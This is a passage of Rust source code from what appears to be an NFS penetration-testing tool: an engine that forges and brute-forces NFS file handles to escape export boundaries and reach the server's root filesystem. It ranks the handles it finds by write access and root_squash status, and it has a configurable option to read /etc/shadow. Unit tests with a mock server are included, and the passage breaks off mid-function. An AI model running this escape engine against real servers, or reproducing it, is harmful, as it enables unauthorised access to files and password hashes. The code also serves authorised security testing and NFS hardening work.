//! Version-neutral NFS export escape engine.
//!
//! Constructs filesystem root handles from export handles to break out of
//! NFS export boundaries. Works through the `EscapeProbe` trait so the same
//! algorithm serves both the `escape` subcommand (Nfs3Client) and the
//! `escape-root` shell command (ShellOps).

use std::collections::HashSet;

use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, FsType, fsid_len_for_type};
use crate::proto::nfs3::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;

/// Probe interface for testing escape candidate handles.
///
/// Abstraction over the NFS version and transport so the escape algorithm
/// is version-neutral. Implemented by both the subcommand (wrapping Nfs3Client)
/// and the shell (wrapping ShellOps).
pub(crate) trait EscapeProbe: Send + Sync {
    /// GETATTR on a raw handle. Returns `Ok((is_directory, fileid))` or `Err`.
    /// On permission denied, the error message must contain "ACCES" or "PERM".
    fn probe_getattr(&self, handle: &[u8]) -> impl Future<Output = anyhow::Result<(bool, u64)>> + Send;

    /// LOOKUP a name in a directory. Returns the child handle bytes.
    fn probe_lookup(&self, dir: &[u8], name: &str) -> impl Future<Output = anyhow::Result<Vec<u8>>> + Send;
}

/// Configuration for the escape algorithm.
pub(crate) struct EscapeConfig {
    /// Number of BTRFS subvolume IDs to try (starting at 256).
    pub btrfs_subvols: u32,
    /// Maximum inode number to scan in the brute-force pass.
    pub max_root_scan: u32,
    /// Print progress lines to stderr.
    pub announce: bool,
}

impl Default for EscapeConfig {
    fn default() -> Self {
        Self { btrfs_subvols: 16, max_root_scan: 200, announce: true }
    }
}

/// Result of the escape attempt.
pub(crate) enum EscapeRootOutcome {
    /// Successfully constructed and verified a root handle.
    Success(EscapeResult),
    /// Handle format is valid (STALE hits) but root not found in scan range.
    StaleNoRoot,
    /// Server rejected handle format (BADHANDLE or non-Linux).
    Unsupported,
}

/// Run the full escape algorithm: known candidates -> BTRFS subvols -> ZFS -> brute-force.
///
/// This is the single entry point for the export-escape primitive. Both
/// `cli/escape.rs` (subcommand) and `shell/mod.rs` (`escape-root` command)
/// call this function through their respective `EscapeProbe` implementations.
pub(crate) async fn find_escape_root(probe: &(impl EscapeProbe + ?Sized), export_handle: &[u8], config: &EscapeConfig) -> EscapeRootOutcome {
    let fh = FileHandle::from_bytes(export_handle);

    // Get the export's own fileid for the identity check in probe_candidate().
    // If a constructed root handle resolves to the same fileid as the export,
    // it is the export itself (whole-filesystem export) and not an escape.
    //
    // Exception: when the seed has fileid_type=0 (MOUNT/LOOKUP root handle),
    // skip the fileid check. The escape constructs a fileid_type=1 handle for
    // the SAME root directory --the fileid will match but the handle bytes
    // differ. This is the desired behavior: converting a type-0 root handle
    // into a type-1 handle that can be further manipulated.
    let seed_fileid_type = export_handle.get(3).copied().unwrap_or(0);
    let export_fileid = if seed_fileid_type == 0 {
        None // type-0 root handle --fileid identity check would reject valid escapes
    } else {
        probe.probe_getattr(export_handle).await.ok().map(|(_, id)| id)
    };

    // Phase 1: INO32_GEN candidates (standard Linux handle format, various root inodes)
    let known = FileHandleAnalyzer::construct_root_candidates(&fh);
    for candidate in &known {
        if config.announce {
            tracing::debug!("Probing {} ...", candidate.label);
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 1b: BTRFS subvolume scan
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, config.btrfs_subvols);
    let mut announced: HashSet<u32> = HashSet::new();
    for candidate in &btrfs {
        if config.announce && announced.insert(candidate.inode_number) {
            tracing::debug!("Probing BTRFS subvol {} ...", candidate.inode_number);
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 1c: Filesystem-specific constructors (ZFS, EROFS, NILFS2, bcachefs, UDF, ISO9660)
    let fs_specific: Vec<EscapeResult> = [
        FileHandleAnalyzer::construct_zfs_root_handle(&fh),
        FileHandleAnalyzer::construct_erofs_root_handle(&fh, 36),
        FileHandleAnalyzer::construct_nilfs2_root_handles(&fh),
        FileHandleAnalyzer::construct_bcachefs_root_handle(&fh),
        FileHandleAnalyzer::construct_udf_root_candidates(&fh),
        FileHandleAnalyzer::construct_iso9660_root_candidates(&fh),
    ]
    .into_iter()
    .flatten()
    .collect();

    for candidate in &fs_specific {
        if config.announce {
            tracing::debug!("Probing {} ...", candidate.label);
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 2: Brute-force scan.
    // 2a: inodes 1..6 with gen 0..5 (catches reiserfs gen=1, NTFS gen=5, etc.)
    // 2b: inodes 1..max_root_scan with gen=0 only (wider sweep, gen=0 covers most FSes)
    let mut found_stale = !known.is_empty() || !btrfs.is_empty();
    if found_stale && config.announce {
        tracing::debug!("Known candidates returned STALE -- brute-force scanning inodes 1..={}", config.max_root_scan);
    }

    // 2a: small inode range with gen sweep (6 * 6 = 36 probes, doubled for compound UUID)
    for inode in 1..=5 {
        for generation in 0..=5 {
            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, generation);
            for candidate in &candidates {
                if let Some(outcome) = probe_brute_force(probe, candidate, export_fileid, export_handle, &mut found_stale).await {
                    return outcome;
                }
            }
        }
    }

    // 2b: wider inode range with gen=0 only
    for inode in 6..=config.max_root_scan {
        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, 0);
        for candidate in &candidates {
            if let Some(outcome) = probe_brute_force(probe, candidate, export_fileid, export_handle, &mut found_stale).await {
                return outcome;
            }
        }
    }

    if found_stale { EscapeRootOutcome::StaleNoRoot } else { EscapeRootOutcome::Unsupported }
}

/// Probe a brute-force candidate. Returns `Some(Success)` if the candidate is
/// confirmed as the filesystem root, `None` to continue scanning.
/// Updates `found_stale` when the handle format is accepted.
async fn probe_brute_force(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8], found_stale: &mut bool) -> Option<EscapeRootOutcome> {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((true, fileid)) => {
            if export_fileid.is_none_or(|exp| fileid != exp) && candidate.root_handle.as_bytes() != export_handle && is_root_dir(probe, candidate.root_handle.as_bytes(), fileid).await {
                return Some(EscapeRootOutcome::Success(candidate.clone()));
            }
            *found_stale = true;
        },
        Ok((false, _)) => {
            *found_stale = true;
        },
        Err(e) => {
            let msg = format!("{e:#}");
            if is_acces(&msg) || msg.contains("STALE") || msg.contains("stale") {
                *found_stale = true;
            }
        },
    }
    None
}

/// Test a single candidate handle against the probe.
async fn probe_candidate(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8]) -> bool {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((is_dir, fileid)) => {
            if !is_dir {
                return false;
            }
            // Handle bytes must differ from the export handle (identity check).
            if candidate.root_handle.as_bytes() == export_handle {
                return false;
            }
            // For non-BTRFS: a matching fileid means the constructed handle
            // resolves to the export's own root directory (whole-filesystem export).
            // BTRFS subvolumes share fileid 256, so we skip the fileid check.
            if candidate.fs_type != FsType::Btrfs && export_fileid.is_some_and(|exp| fileid == exp) {
                return false;
            }
            true
        },
        Err(e) => {
            let msg = format!("{e:#}");
            // ACCES/PERM = format accepted, root_squash blocks read.
            // The handle format is valid even though we cannot read attrs.
            is_acces(&msg)
        },
    }
}

/// Confirm a directory is the filesystem root: LOOKUP ".." must resolve back to self.
///
/// The filesystem root is its own parent (per POSIX), so `..` from the root
/// resolves to the root itself. A subdirectory has a different parent.
/// This also matches the NFSv4 pseudo-root, but that's acceptable -- the
/// escape engine prefers reporting more handles (including pseudo-root
/// matches) over missing real handles. Deduplication by handle bytes
/// prevents redundant output.
async fn is_root_dir(probe: &(impl EscapeProbe + ?Sized), handle: &[u8], self_fileid: u64) -> bool {
    let Ok(parent) = probe.probe_lookup(handle, "..").await else {
        return false;
    };
    let Ok((_, parent_fileid)) = probe.probe_getattr(&parent).await else {
        return false;
    };
    parent_fileid == self_fileid
}

/// Check if an error message indicates a permission denial.
fn is_acces(msg: &str) -> bool {
    msg.contains("ACCES") || msg.contains("PERM")
}

// --- Concrete EscapeProbe implementations ---

/// `EscapeProbe` wrapping a pooled NFSv3 client.
///
/// Used by the `escape` subcommand, the analyzer's `check_escape`, and
/// any other caller that has an `Nfs3Client` and wants to run the escape
/// algorithm. Defined here (next to the trait) so consumers don't each
/// need their own copy.
pub(crate) struct Nfs3EscapeProbe<'a> {
    pub client: &'a Nfs3Client,
}

impl EscapeProbe for Nfs3EscapeProbe<'_> {
    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
        let fh = FileHandle::from_bytes(handle);
        let attrs = self.client.attrs(&fh).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok((attrs.file_type == nfs_v3::FileType::Directory, attrs.fileid))
    }

    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
        let fh = FileHandle::from_bytes(dir);
        let (child, _) = self.client.resolve(&fh, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok(child.as_bytes().to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Mock probe: inode 2 with fileid_type=1 is a directory root,
    /// everything else returns STALE.
    struct MockProbe {
        accept_inode: u32,
    }

    impl EscapeProbe for MockProbe {
        async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
            anyhow::ensure!(handle.len() >= 8, "BADHANDLE");
            let fileid_type = handle.get(3).copied().unwrap_or(0);
            if fileid_type != 1 {
                anyhow::bail!("NFS3ERR_BADHANDLE");
            }
            // INO32_GEN: inode at bytes [fsid_len..fsid_len+4].
            // For fsid_type=7 (24-byte fsid): inode starts at byte 28.
            // For fsid_type=6 (16-byte fsid): inode starts at byte 20.
            // Simplified: scan for the 4-byte LE inode anywhere after the fsid.
            let fsid_type = handle.get(2).copied().unwrap_or(0);
            let fsid_len = match fsid_type {
                2 => 12,
                6 => 16, // UUID-only: 16 bytes (matches fsid_len_for_type)
                7 => 24, // compound UUID: 8-byte dev + 16-byte UUID (matches fsid_len_for_type)
                _ => 8,
            };
            let inode_offset = 4 + fsid_len;
            if handle.len() < inode_offset + 4 {
                anyhow::bail!("NFS3ERR_STALE");
            }
            assert!(handle.len() >= inode_offset + 4, "handle too short for inode");
            let inode = u32::from_le_bytes([handle[inode_offset], handle[inode_offset + 1], handle[inode_offset + 2], handle[inode_offset + 3]]);
            if inode == self.accept_inode {
                Ok((true, u64::from(inode)))
            } else {
                anyhow::bail!("NFS3ERR_STALE");
            }
        }

        async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
            if name == ".." || name == "etc" || name == "bin" || name == "usr" {
                return Ok(dir.to_vec());
            }
            anyhow::bail!("NFS3ERR_NOENT");
        }
    }

    #[tokio::test]
    async fn find_escape_root_succeeds_on_inode_2() {
        // Seed: fsid_type=7 (compound UUID, 28-byte fsid), fileid_type=0.
        let mut seed = vec![0x01, 0x00, 0x07, 0x00];
        seed.extend_from_slice(&[0; 24]); // 24-byte fsid

        let config = EscapeConfig { btrfs_subvols: 0, max_root_scan: 5, announce: false };
        // accept_inode=2: the INO32_GEN candidate with inode=2 should be tried
        let result = find_escape_root(&MockProbe { accept_inode: 2 }, &seed, &config).await;

        assert!(matches!(result, EscapeRootOutcome::Success(_)), "expected escape success");
    }

    #[tokio::test]
    async fn find_escape_root_unsupported_on_short_handle() {
        let seed = vec![0x01, 0x00]; // too short
        let config = EscapeConfig { btrfs_subvols: 0, max_root_scan: 3, announce: false };
        let result = find_escape_root(&MockProbe { accept_inode: 2 }, &seed, &config).await;
        assert!(matches!(result, EscapeRootOutcome::Unsupported));
    }

    #[test]
    fn is_acces_detects_permission_errors() {
        assert!(is_acces("NFS3ERR_ACCES"));
        assert!(is_acces("NFS3ERR_PERM"));
        assert!(is_acces("operation denied: ACCES"));
        assert!(!is_acces("NFS3ERR_STALE"));
        assert!(!is_acces("timeout"));
    }
}

// --- Pipeline types and pure-computation functions ---

/// An export path discovered during Phase 1a, with metadata about which
/// discovery channel(s) found it.
#[derive(Debug, Clone)]
pub(crate) struct DiscoveredExport {
    pub path: String,
    /// Which channels found this export (e.g. "MOUNT v3 EXPORT", "NFSv4 pseudo-FS walk").
    pub sources: Vec<&'static str>,
}

/// A file handle seed from Phase 1, tagged with its provenance and whether
/// it sits at an export-boundary level (is_root=true) or is a child entry.
#[derive(Debug, Clone)]
pub(crate) struct EscapeSeed {
    pub handle: FileHandle,
    /// Human-readable source label (e.g. "MOUNT v3 /srv/nfs").
    pub source: String,
    /// True for export boundaries, upward-traversal results, and protocol
    /// root handles; false for child entries from READDIRPLUS/READDIR.
    pub is_root: bool,
    /// NFS version that acquired this seed: 2, 3, or 4. `None` for seeds
    /// from generic/version-neutral sources (WebNFS, traversal children).
    pub nfs_version: Option<u8>,
}

/// A candidate handle to probe during Phase 3, produced by Phase 2
/// construction or copied from a Phase 1 seed.
#[derive(Debug, Clone)]
pub(crate) struct EscapeCandidate {
    /// The handle to probe.
    pub handle: FileHandle,
    /// Which seed produced this candidate (or "seed" if it is the seed itself).
    pub seed_source: String,
    /// Inferred filesystem type.
    pub fs_type: FsType,
    /// Human-readable label (e.g. "seed: MOUNT v3 /srv/nfs", "ext4 inode 2 gen=0").
    pub label: String,
    /// Inode/object number embedded in the handle (0 for raw seeds).
    pub inode_number: u32,
}

/// A confirmed tree-top from Phase 3, enriched with rootfs data in Phase 4b.
#[derive(Debug, Clone)]
pub(crate) struct VerifiedTreeTop {
    pub candidate: EscapeCandidate,
    /// Which versions confirmed this as a tree-top (any combination).
    pub v3_confirmed: bool,
    pub v2_confirmed: bool,
    pub v4_confirmed: bool,
    /// The uid/gid pair that succeeded (0/0 if no escalation needed).
    pub uid: u32,
    pub gid: u32,
    /// Rootfs detection score from Phase 4b directory listing. 0 until Phase 4b runs.
    pub rootfs_score: u32,
    /// Directory names found during rootfs detection.
    pub rootfs_dirs: Vec<String>,
    /// True when rootfs_score >= ROOTFS_THRESHOLD -- this handle reaches the server's root filesystem.
    pub os_escape: bool,
    /// Export-level access classification (probed in Phase 4b).
    pub access_rank: AccessRank,
}

/// Export-level access classification for dedup ranking.
///
/// Probed by attempting reads with different identities. Derived `Ord`
/// ranks variants by declaration order -- best first so `max()` picks
/// the most useful handle during dedup.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) enum AccessRank {
    /// Not yet probed (sorts lowest).
    Unknown = 0,
    /// all_squash: every identity is mapped to nobody.
    AllSquash = 1,
    /// root_squash + ro.
    RootSquashRo = 2,
    /// all_squash + rw (can write as nobody).
    AllSquashRw = 3,
    /// root_squash + rw.
    RootSquashRw = 4,
    /// no_root_squash + ro.
    NoSquashRo = 5,
    /// no_root_squash + rw.
    NoSquashRw = 6,
}

/// A scored and annotated tree-top, ready for Phase 6 reporting.
#[derive(Debug, Clone)]
pub(crate) struct AnnotatedTreeTop {
    pub tree_top: VerifiedTreeTop,
    pub score: u32,
    pub annotation: String,
}

/// Pipeline configuration derived from CLI flags.
#[derive(Debug, Clone)]
pub(crate) struct PipelineConfig {
    /// Fast mode: one export, one version, no brute-force.
    pub fast: bool,
    /// Number of BTRFS subvolume IDs to try (starting at 256). Fast mode forces 2.
    pub btrfs_subvols: u32,
    /// Maximum inode number to scan in the brute-force pass. Fast mode skips brute-force.
    pub max_root_scan: u32,
    /// JSON output to stdout instead of console.
    pub json: bool,
    /// Attempt /etc/shadow read from the best OS-ESCAPE handle.
    pub read_shadow: bool,
    /// Show all handles including cross-export duplicates (--all-handles).
    /// When false (default), results are collapsed to one per filesystem.
    pub all_handles: bool,
}

/// Statistics collected during the pipeline for reporting.
#[derive(Debug, Clone)]
pub(crate) struct EscapeStats {
    pub seeds: usize,
    pub candidates: usize,
    pub candidates_before_dedup: usize,
    pub tree_tops_confirmed: usize,
    pub tree_tops_filtered: usize,
    pub tree_tops_reported: usize,
}

// --- Constants for rootfs detection and scoring ---

/// Rootfs score threshold for OS-ESCAPE tagging.
pub(crate) const ROOTFS_THRESHOLD: u32 = 30;

/// Score bonus applied when a tree-top is confirmed as the server rootfs.
pub(crate) const ROOTFS_BONUS: u32 = 200;

/// Tier-1 rootfs directory names: only exist at `/`, +15 each.
pub(crate) const TIER1_NAMES: &[&str] = &["proc", "sys", "dev", "run"];

/// Tier-2 rootfs directory names: commonly at `/` but can appear elsewhere, +5 each.
pub(crate) const TIER2_NAMES: &[&str] = &["boot", "mnt", "media", "srv", "bin", "sbin", "lib", "etc", "tmp", "var", "usr", "opt", "home", "root"];

// --- Pure-computation functions ---

/// Score a directory listing against known rootfs directory names.
///
/// Tier-1 names (proc, sys, dev, run) get +15 each -- these are kernel
/// mount points that only exist at the real `/`. Tier-2 names get +5 each.
/// A score >= ROOTFS_THRESHOLD (30) indicates the directory is likely `/`.
pub(crate) fn rootfs_score(dir_names: &[&str]) -> u32 {
    let mut score: u32 = 0;
    for name in dir_names {
        if TIER1_NAMES.contains(name) {
            score += 15;
        } else if TIER2_NAMES.contains(name) {
            score += 5;
        }
    }
    score
}

/// Score a verified tree-top for ranking. Higher = more useful to the operator.
///
/// Components: fsid_type quality, fileid_type quality, version bonus, rootfs bonus.
/// The rootfs bonus (200) ensures OS-ESCAPE handles always sort above others.
pub(crate) fn score_tree_top(tt: &VerifiedTreeTop) -> u32 {
    let handle_bytes = tt.candidate.handle.as_bytes();

    // fsid_type score: byte 2 of the handle
    let fsid_type = handle_bytes.get(2).copied().unwrap_or(0);
    let fsid_score = match fsid_type {
        7 => 100, // compound UUID -- real filesystem, most complete handle format
        6 => 50,  // UUID-only -- real filesystem, less context
        1 => 0,   // pseudo-root handle
        _ => 25,
    };

    // fileid_type score: byte 3 of the handle
    let fileid_type = handle_bytes.get(3).copied().unwrap_or(0);
    let fileid_score = match fileid_type {
        2 => 20,        // INO32_GEN_PARENT -- most complete, includes parent
        1 | 0x81 => 15, // standard inode format (32-bit or 64-bit)
        0x4d => 10,     // BTRFS subvol
        _ => 5,
    };

    // Version bonus: v3 is the most capable, v2 and v4 add reach
    let mut version_bonus: u32 = 0;
    if tt.v3_confirmed {
        version_bonus += 10;
    }
    if tt.v2_confirmed {
        version_bonus += 5;
    }
    if tt.v4_confirmed {
        version_bonus += 5;
    }

    // Rootfs bonus: confirmed server rootfs gets top priority
    let rootfs_bonus = if tt.os_escape { ROOTFS_BONUS } else { 0 };

    fsid_score + fileid_score + version_bonus + rootfs_bonus
}

/// Generate a human-readable annotation for a verified tree-top.
///
/// Describes the handle's quality, filesystem type, version support, and
/// rootfs detection results. Used in Phase 6 reporting.
pub(crate) fn annotate_tree_top(tt: &VerifiedTreeTop, score: u32) -> String {
    let handle_bytes = tt.candidate.handle.as_bytes();
    let fsid_type = handle_bytes.get(2).copied().unwrap_or(0);
    let fileid_type = handle_bytes.get(3).copied().unwrap_or(0);

    let fsid_label = match fsid_type {
        7 => "compound-UUID",
        6 => "UUID-only",
        1 => "pseudo",
        0 => "dev-major:minor",
        _ => "other",
    };

    let fileid_label = match fileid_type {
        0 => "root",
        1 => "ino32+gen",
        2 => "ino32+gen+parent",
        0x4d => "btrfs",
        0x81 => "ino64+gen",
        _ => "other",
    };

    let fs_label = match tt.candidate.fs_type {
        FsType::Ext4 => "ext4",
        FsType::Xfs => "XFS",
        FsType::Btrfs => "BTRFS",
        FsType::Zfs => "ZFS",
        FsType::Erofs => "EROFS",
        FsType::Udf => "UDF",
        FsType::Iso9660 => "ISO9660",
        FsType::Unknown => "unknown",
    };

    // UUID prefix for grouping handles from the same disk (first 4 bytes of fsid after header)
    let uuid_prefix = if let Some(&[a, b, c, d]) = handle_bytes.get(4..8) { format!("{a:02x}{b:02x}{c:02x}{d:02x}") } else { "n/a".to_owned() };

    let mut versions = Vec::new();
    if tt.v3_confirmed {
        versions.push("v3");
    }
    if tt.v2_confirmed {
        versions.push("v2");
    }
    if tt.v4_confirmed {
        versions.push("v4");
    }

    let mut parts = Vec::new();

    // Verdict based on handle structure
    if fsid_type == 1 && fileid_type == 0 {
        parts.push("NFSv4 pseudo-root, virtual directory not a real filesystem".to_owned());
    } else if fileid_type == 0x4d {
        parts.push("BTRFS volume top".to_owned());
    } else {
        parts.push(format!("{fs_label} inode {} gen-based handle", tt.candidate.inode_number));
    }

    parts.push(format!("fsid={fsid_label}, fileid={fileid_label}, fs={uuid_prefix}"));
    parts.push(format!("versions: [{}]", versions.join(", ")));
    parts.push(format!("uid={}, gid={}", tt.uid, tt.gid));
    parts.push(format!("score={score}"));

    if tt.os_escape {
        parts.push(format!("rootfs dirs: {} (rootfs_score={})", tt.rootfs_dirs.join(", "), tt.rootfs_score));
    }

    parts.join("; ")
}

/// Score, annotate, and sort tree-tops for Phase 5 output.
///
/// Returns tree-tops sorted descending by score (best handles first).
pub(crate) fn score_and_annotate(tree_tops: Vec<VerifiedTreeTop>) -> Vec<AnnotatedTreeTop> {
    let mut annotated: Vec<AnnotatedTreeTop> = tree_tops
        .into_iter()
        .map(|tt| {
            let score = score_tree_top(&tt);
            let annotation = annotate_tree_top(&tt, score);
            AnnotatedTreeTop { tree_top: tt, score, annotation }
        })
        .collect();
    annotated.sort_by_key(|a| std::cmp::Reverse(a.score));
    annotated
}

/// Deduplicate tree-tops by handle bytes and filter out known export boundaries.
///
/// Handles from different exports can reach the same filesystem root via
/// different fsid bytes -- these are NOT deduped because they may carry
/// different export-level permissions (ro vs rw, root_squash vs
/// no_root_squash, all_squash). The operator needs distinct handles for
/// distinct access levels. Phase 4b's readability filter removes handles
/// that can't actually be read with any credential.
pub(crate) fn dedup_and_filter(tree_tops: Vec<VerifiedTreeTop>, known_boundaries: &HashSet<Vec<u8>>) -> Vec<VerifiedTreeTop> {
    let mut seen: std::collections::HashMap<Vec<u8>, usize> = std::collections::HashMap::new();
    let mut deduped: Vec<VerifiedTreeTop> = Vec::new();

    for tt in tree_tops {
        let key = tt.candidate.handle.as_bytes().to_vec();
        if let Some(existing) = seen.get(&key).and_then(|&idx| deduped.get_mut(idx)) {
            existing.v3_confirmed |= tt.v3_confirmed;
            existing.v2_confirmed |= tt.v2_confirmed;
            existing.v4_confirmed |= tt.v4_confirmed;
            if !existing.candidate.label.contains(&tt.candidate.label) {
                existing.candidate.label = format!("{} + {}", existing.candidate.label, tt.candidate.label);
            }
        } else {
            let _ = seen.insert(key, deduped.len());
            deduped.push(tt);
        }
    }

    deduped.retain(|tt| !known_boundaries.contains(tt.candidate.handle.as_bytes()));

    deduped
}

/// Collapse results to one handle per filesystem (default behavior).
///
/// Groups by (filesystem UUID, inode number). For each group, keeps the
/// handle with the best `access_rank` (no_squash+rw > root_squash+rw >
/// all_squash, etc.). Ties broken by score, then version count.
pub(crate) fn dedup_by_filesystem(tree_tops: Vec<AnnotatedTreeTop>) -> Vec<AnnotatedTreeTop> {
    let mut seen: std::collections::HashMap<(Vec<u8>, u32), usize> = std::collections::HashMap::new();
    let mut deduped: Vec<AnnotatedTreeTop> = Vec::new();

    for att in tree_tops {
        let fs_id = extract_fs_identity(&att.tree_top.candidate.handle);
        let ino = att.tree_top.candidate.inode_number;
        let key = (fs_id, ino);

        if let Some(existing) = seen.get(&key).and_then(|&idx| deduped.get_mut(idx)) {
            // Prefer: higher access_rank, then higher score, then more versions.
            let dominated = att.tree_top.access_rank > existing.tree_top.access_rank
                || (att.tree_top.access_rank == existing.tree_top.access_rank && att.score > existing.score)
                || (att.tree_top.access_rank == existing.tree_top.access_rank && att.score == existing.score && version_count(&att) > version_count(existing));
            if dominated {
                *existing = att;
            } else {
                existing.tree_top.v3_confirmed |= att.tree_top.v3_confirmed;
                existing.tree_top.v2_confirmed |= att.tree_top.v2_confirmed;
                existing.tree_top.v4_confirmed |= att.tree_top.v4_confirmed;
            }
        } else {
            let _ = seen.insert(key, deduped.len());
            deduped.push(att);
        }
    }

    deduped
}

fn version_count(att: &AnnotatedTreeTop) -> u8 {
    u8::from(att.tree_top.v3_confirmed) + u8::from(att.tree_top.v2_confirmed) + u8::from(att.tree_top.v4_confirmed)
}

/// Extract a filesystem identity from a handle for --unique dedup.
///
/// For UUID-based handles (fsid_type 6 or 7), returns the 16-byte UUID.
/// For dev-based handles (fsid_type 0-5), returns the raw fsid bytes.
/// Falls back to the full handle bytes for unknown formats.
fn extract_fs_identity(handle: &FileHandle) -> Vec<u8> {
    let data = handle.as_bytes();
    if data.len() < 4 || data.first().copied() != Some(0x01) {
        return data.to_vec();
    }
    let fsid_type = data.get(2).copied().unwrap_or(0);
    let Some(fsid_len) = fsid_len_for_type(fsid_type as usize) else {
        return data.to_vec();
    };
    let Some(fsid) = data.get(4..4 + fsid_len) else {
        return data.to_vec();
    };
    // Compound UUID (type 7): extract just the 16-byte UUID portion.
    if fsid_type == 7
        && fsid_len == 24
        && let Some(uuid) = fsid.get(8..24)
    {
        return uuid.to_vec();
    }
    fsid.to_vec()
}

/// Extract the generation value embedded in a seed handle's fileid section.
///
/// Supports four fileid layouts:
///   - fileid_type 1 (INO32_GEN) / 2 (INO32_GEN_PARENT): 4-byte inode + 4-byte gen
///   - fileid_type 0x81 (INO64_GEN, XFS 64-bit): 8-byte inode + 4-byte gen
///   - fileid_type 0x4d (BTRFS_WITHOUT_PARENT): objectid(8) + root_objectid(8) + gen(4)
///
/// Returns `None` for other fileid types or handles too short to contain a gen.
pub(crate) fn extract_seed_gen(handle: &FileHandle) -> Option<u32> {
    let data = handle.as_bytes();
    if data.len() < 8 {
        return None;
    }
    let fileid_type = data.get(3).copied()?;
    let fsid_type = data.get(2).copied()?;
    let fsid_len = fsid_len_for_type(fsid_type as usize)?;
    match fileid_type {
        // INO32_GEN or INO32_GEN_PARENT: gen is 4 bytes after the 4-byte inode
        1 | 2 => {
            // Layout: [header(4)] [fsid(fsid_len)] [inode(4)] [gen(4)]
            let gen_offset = 4 + fsid_len + 4;
            let gen_bytes: [u8; 4] = data.get(gen_offset..gen_offset + 4)?.try_into().ok()?;
            Some(u32::from_le_bytes(gen_bytes))
        },
        // INO64_GEN (XFS 64-bit inodes): gen is 4 bytes after the 8-byte inode
        0x81 => {
            // Layout: [header(4)] [fsid(fsid_len)] [inode(8)] [gen(4)]
            let gen_offset = 4 + fsid_len + 8;
            let gen_bytes: [u8; 4] = data.get(gen_offset..gen_offset + 4)?.try_into().ok()?;
            Some(u32::from_le_bytes(gen_bytes))
        },
        // BTRFS_WITHOUT_PARENT: gen follows objectid(8) + root_objectid(8)
        0x4d => {
            // Layout: [header(4)] [fsid(fsid_len)] [objectid(8)] [root_objectid(8)] [gen(4)]
            let gen_offset = 4 + fsid_len + 16;
            let gen_bytes: [u8; 4] = data.get(gen_offset..gen_offset + 4)?.try_into().ok()?;
            Some(u32::from_le_bytes(gen_bytes))
        },
        _ => None,
    }
}

/// Construct all escape candidates from the seed pool (Phase 2).
///
/// Steps:
///   0. Copy every seed as a candidate (server-given handles).
///   1. Extract generation values from seed handles.
///   2. Known filesystem-top candidates via `construct_root_candidates`.
///   3. BTRFS subvolume handles.
///   4. Filesystem-specific constructors (ZFS, EROFS, NILFS2, bcachefs, UDF, ISO9660).
///   5. Brute-force inode scan (skipped in fast mode).
///
/// Returns `(deduped_candidates, count_before_dedup)`.
pub(crate) fn construct_candidates(seeds: &[EscapeSeed], config: &PipelineConfig) -> (Vec<EscapeCandidate>, usize) {
    let mut all: Vec<EscapeCandidate> = Vec::new();

    let effective_btrfs_subvols = if config.fast { 2 } else { config.btrfs_subvols };

    for seed in seeds {
        let fh = &seed.handle;
        let seed_gen = extract_seed_gen(fh);

        // Step 0: Copy seed as-is into the candidate pool.
        all.push(EscapeCandidate { handle: fh.clone(), seed_source: seed.source.clone(), fs_type: FileHandleAnalyzer::fingerprint_fs(fh), label: format!("seed: {}", seed.source), inode_number: 0 });

        // Step 2: Known filesystem-top candidates (9 entries in the static table).
        let known = FileHandleAnalyzer::construct_root_candidates(fh);
        for er in &known {
            all.push(escape_result_to_candidate(er, &seed.source));
        }
        // If seed_gen is available, also try each known inode with the seed's generation.
        if let Some(seed_generation) = seed_gen {
            for &(inode, _) in &[(2u32, 0u32), (3, 0), (1, 0), (128, 0), (64, 0), (32, 0), (5, 5), (2, 1), (7, 0)] {
                let variants = FileHandleAnalyzer::construct_candidates_all_variants(fh, inode, seed_generation);
                for er in &variants {
                    all.push(escape_result_to_candidate(er, &seed.source));
                }
            }
        }

        // Step 3: BTRFS subvolume handles.
        let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(fh, effective_btrfs_subvols);
        for er in &btrfs {
            all.push(escape_result_to_candidate(er, &seed.source));
        }

        // Step 4: Filesystem-specific constructors.
        let fs_specific: Vec<EscapeResult> = [
            FileHandleAnalyzer::construct_zfs_root_handle(fh),
            FileHandleAnalyzer::construct_erofs_root_handle(fh, 36),
            FileHandleAnalyzer::construct_nilfs2_root_handles(fh),
            FileHandleAnalyzer::construct_bcachefs_root_handle(fh),
            FileHandleAnalyzer::construct_udf_root_candidates(fh),
            FileHandleAnalyzer::construct_iso9660_root_candidates(fh),
        ]
        .into_iter()
        .flatten()
        .collect();

        for er in &fs_specific {
            all.push(escape_result_to_candidate(er, &seed.source));
        }

        // Step 5: Brute-force inode scan (skipped in fast mode).
        if !config.fast {
            // 5a: Dense low-inode sweep: inodes 1-5, gens 0-5
            for inode in 1..=5 {
                for generation in 0..=5 {
                    let candidates = FileHandleAnalyzer::construct_candidates_all_variants(fh, inode, generation);
                    for er in &candidates {
                        all.push(escape_result_to_candidate(er, &seed.source));
                    }
                }
                // Also try seed_gen if available and > 5 (not already covered)
